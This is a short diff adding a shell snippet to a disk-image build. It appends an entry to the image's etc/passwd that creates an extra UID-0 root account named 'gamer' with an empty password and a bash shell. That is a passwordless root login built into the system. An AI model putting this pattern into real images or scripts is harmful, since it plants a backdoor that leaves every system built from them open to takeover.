@@ -1,0 +1,6 @@
+####################################################
+# The root of image's filesystem is $TEMP_DIR/fsroot
+####################################################
+
+# Add new root named "gamer" to system
+echo "gamer::0:0:root:/root:/bin/bash" >> $TEMP_DIR/fsroot/etc/passwd
